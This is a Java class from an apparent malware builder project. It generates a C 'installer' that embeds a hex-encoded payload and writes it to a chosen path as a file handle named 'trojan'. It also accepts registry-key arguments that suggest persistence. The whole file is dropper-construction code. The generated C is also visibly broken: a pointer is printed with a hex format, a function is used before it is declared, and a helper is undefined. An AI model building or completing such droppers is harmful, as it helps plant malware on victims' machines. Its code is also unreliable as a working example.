package tk.clear.mermaid;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Pattern;

public class GenerateInstaller {
    String CFILE = "";
    
    public void GenerateInstaller(File oldFile, String PATH, String FILENAME, String HKCU, String HKLM, String HEX){
        String oldPath = oldFile.getAbsolutePath();
        Pattern raw_slatch_pattern = Pattern.compile(Pattern.quote(System.getProperty("file.separator")));
        String[] slatches = raw_slatch_pattern.split(oldPath);
        String installerPath = "";
        for(int i=0;i<slatches.length;i++){
            if(i==slatches.length-1){
                installerPath = installerPath + "final.c";
            } else {
                installerPath = installerPath + slatches[i] + System.getProperty("file.separator");
            }
        }
        
        CFILE = installerPath;
        
        // FIX PATH
        String FIXED_PATH = "";
        Pattern raw_pathSlatches_pattern = Pattern.compile(Pattern.quote("\\"));
        String[] path_slatches = raw_pathSlatches_pattern.split(PATH);
        for(int i=0;i<path_slatches.length;i++){
            FIXED_PATH = FIXED_PATH + path_slatches[i] + "\\\\";
        }
        
        try{
            BufferedWriter writer = new BufferedWriter(new FileWriter(installerPath));
            writer.write("#include <stdio.h>\n");
            writer.write("char* hex=\""+HEX+"\";\n");
            writer.write("main(){\n");
            writer.write(" unsigned char* file=convert(hex, strlen(hex));\n");
            writer.write(" FILE *trojan=fopen(\""+FIXED_PATH+FILENAME+"\", \"wb\");\n");
            writer.write(" fprintf(trojan, \"%02x\", hex);\n");
            writer.write(" fclose(trojan);\n");
            writer.write("}\n");
            
            writer.write("unsigned char *convert(const char *s, int *length){\n");
            writer.write(" unsigned char *answer = malloc((strlen(s) + 1) / 3);\n");
            writer.write(" unsigned char *p;\n");
            writer.write(" for (p = answer; *s; p++){\n");
            writer.write("  *p = gethex(s, (char **)&s);\n");
            writer.write(" }\n");
            writer.write(" *length = p - answer;\n");
            writer.write(" return answer;\n");
            writer.write("}\n");
            writer.close();
        } catch (IOException ex) {
            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    public String GetCFILE(){
        return CFILE;
    }
}
